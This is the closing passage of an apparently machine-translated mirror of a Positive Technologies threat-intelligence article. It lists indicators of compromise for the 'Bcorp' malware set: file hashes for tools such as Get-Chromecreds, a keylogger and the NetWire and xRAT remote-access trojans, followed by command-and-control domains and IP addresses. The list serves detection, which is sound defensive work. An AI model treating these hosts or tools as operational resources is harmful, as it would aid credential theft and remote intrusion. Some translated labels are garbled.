a4667e0b3bfaca0cda5c344f1475b8e0 <br><br>  Houdini JScript: <br>  04c2ad67de2cea3f247cf50c5e12e969 <br>  5ab9176b9ed9f7a776ec82c412a89eab <br>  84f0d098880747f417703f251a2e0d1c <br>  94c6ba0d812b4daf214263fffc951a20 <br>  a52509a38846b55a524019f2f1a06ade <br>  bf2fb6cdbc9fde99e186f01ad26f959f <br>  c871091ce44594adbd6cf4388381e410 <br>  daf6a9eb55813d1a151695d33506179d <br>  f010af1b330d00abb5149e9defdae6ee <br>  ff924faeb9dfd7384c05abe855566fc9 <br><br>  Bcorp Glas <br>  59978b5a9e4ab36da0f31a8f616cc9d3 <br>  a7219da3b0c0730c476fe340dbf7e4e5 <br>  ddac55213089da9ef407bce05ebe653e <br><br>  Get-Chromecreds <br>  11769e9f49123a2af00bd74453221c07 <br>  1a81c9119d7761535c198ddb761979b8 <br>  42a85849a591e65b0254d9bcbdf59f82 <br>  8e49263f33c53ee5bc91bebbf9617352 <br>  c9ab090ad2badb9862fd5b6058428096 <br><br>  Keylogger starten <br>  55daa84475a11ea656183e0ad5ccc608 <br>  aa82fbb6a341d71d2431b6d2ebca027c <br><br>  WebBrowserPassView <br>  7722e086cf7ed59955a1d6ec26f49cf3 <br><br>  NetWire RAT <br>  1470a08bd427bb8738a254ba4f130ff5 <br>  5f8495016773c7834b1c588f0997a6c4 <br><br>  TCP hören <br>  913567da98185cad9f91a570dc298de1 <br><br>  Skriptlader <br>  02946d10c6a34fe74826f3c0b0a6a3e0 <br>  1ad644bdba488a6e42ad76aea2c0ee54 <br>  3a2dcf36b9206a135daa73c645a3f56f <br>  4dddd87d3cb80145c9859fd76dfef794 <br>  74c5e5be9f79bd9e7ee84fd046c14e68 <br>  78f4d5fa6c68dae4b03860b54ec6cc67 <br><br>  Winzige Pe-Lader <br>  0f3c56018a7051aebe060454fc981f5b <br>  1b9cefc229daddc4557cea0e3bdf4656 <br>  29e6679107bd9c72aa061371082206bb <br>  b66b7395825b9ed656b768d4e7fe1de7 <br>  fbc606b8b04e51ddb342e29b84ac1edb <br><br>  xRAT <br>  2e9a0637478938cc3e4519aa7b4219cc <br>  7c67c93ba243be32e5fd6a6921ceded3 <br><br>  Bcorp Panel vs.  Baumeister <br>  405c987ba1a8568e2808da2b06bc9047 <br>  c3ac8b7a7c8c0d100e3c2af8ccd11441 <br><br>  Bcorp C &amp; C <br>  bcorp.fun <br>  bkorp.xyz <br>  buhar.us <br>  definebilimi.com <br>  husan.ddns.net <br>  husan2.ddns.net <br>  husan3.ddns.net <br>  i36-imgur.com <br>  i37-imgur.com <br>  i38-imgur.com <br>  i39-imgur.com <br>  prntsrcn.com <br>  qqww.eu <br>  5.255.63.12 <br>  192.95.3.137 <br>  192.95.3.14 </div></div><br><br>  Gepostet <b>von</b> Alexey Vishnyakov, Positive Technologies </li></ul></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/de479998/">https://habr.com/ru/post/de479998/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../de479978/index.html">Wie ohne Schmerzen, ohne Sicherheitsabfrage und kostenlos, um Auszüge aus dem Federal State Property Fund des Unified State Register of Human Rights in eine für Menschen lesbare (*) Form zu bringen</a></li>
<li><a href="../de479982/index.html">Vidos und Insekten</a></li>
<li><a href="../de479988/index.html">Technologische Wettbewerbe Radiofest-2019. Zusammenfassung</a></li>
<li><a href="../de479992/index.html">Wie Sie UITextView beibringen, sich von anderen abzuheben</a></li>
<li><a href="../de479996/index.html">2 nm Transistoren: Zerhacken oder Zerhacken?</a></li>
<li><a href="../de480000/index.html">Server WebRTC-Kanalqualitätsanzeige über TCP</a></li>
<li><a href="../de480002/index.html">Rückblick DevOpsDays Moskau: Einblicke aus 6 Berichten</a></li>
<li><a href="../de480006/index.html">Kanalqualitätsindikator für Server WebRTC über TCP</a></li>
<li><a href="../de480008/index.html">Yuri Rogachev: "Ich bin gekommen, um das M-1 zu machen, ohne Computertechnologie zu kennen"</a></li>
<li><a href="../de480010/index.html">Top 3 HTML-Elemente, die wir vergessen haben</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>